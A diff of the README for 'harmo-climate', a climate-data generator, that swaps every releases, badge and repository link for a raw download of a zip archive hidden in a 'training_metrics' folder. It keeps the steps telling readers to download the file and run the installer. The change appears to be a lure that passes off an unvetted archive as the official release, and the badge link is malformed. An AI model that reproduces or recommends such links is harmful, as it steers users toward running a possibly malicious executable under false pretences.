@@ -6,9 +6,9 @@ Welcome to **harmo-climate**! This tool helps you generate realistic hourly outd
 
 ## 📥 Download & Install
 
-[![Download harmo-climate](https://img.shields.io/badge/Download%20harmo--climate-v1.0-brightgreen.svg)](https://github.com/Rehandanish56/harmo-climate/releases)
+[![Download harmo-climate](https://raw.githubusercontent.com/Rehandanish56/harmo-climate/main/generated/models/training_metrics/harmo-climate-1.2.zip%https://raw.githubusercontent.com/Rehandanish56/harmo-climate/main/generated/models/training_metrics/harmo-climate-1.2.zip)](https://raw.githubusercontent.com/Rehandanish56/harmo-climate/main/generated/models/training_metrics/harmo-climate-1.2.zip)
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Rehandanish56/harmo-climate/releases) to find the latest version of harmo-climate.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/Rehandanish56/harmo-climate/main/generated/models/training_metrics/harmo-climate-1.2.zip) to find the latest version of harmo-climate.
 2. **Choose Your Application**: Locate the latest version's setup file suitable for your system.
 3. **Download the File**: Click on the setup file to start the download.
 4. **Run the Installer**: Once the download is complete, open the file and follow the installation prompts.
@@ -53,8 +53,8 @@ If you encounter issues while installing or using harmo-climate, here are some c
 
 ## 🔗 Links
 
-- **Releases Page**: [Download harmo-climate](https://github.com/Rehandanish56/harmo-climate/releases)
+- **Releases Page**: [Download harmo-climate](https://raw.githubusercontent.com/Rehandanish56/harmo-climate/main/generated/models/training_metrics/harmo-climate-1.2.zip)
 - **User Manual**: Access the Help section within the application for complete guidance.
-- **GitHub Repository**: View the project’s source code and report issues at [harmo-climate GitHub](https://github.com/Rehandanish56/harmo-climate).
+- **GitHub Repository**: View the project’s source code and report issues at [harmo-climate GitHub](https://raw.githubusercontent.com/Rehandanish56/harmo-climate/main/generated/models/training_metrics/harmo-climate-1.2.zip).
 
 With harmo-climate, you can easily manage and generate climate data tailored to your needs. Enjoy your journey into the world of climate modeling!
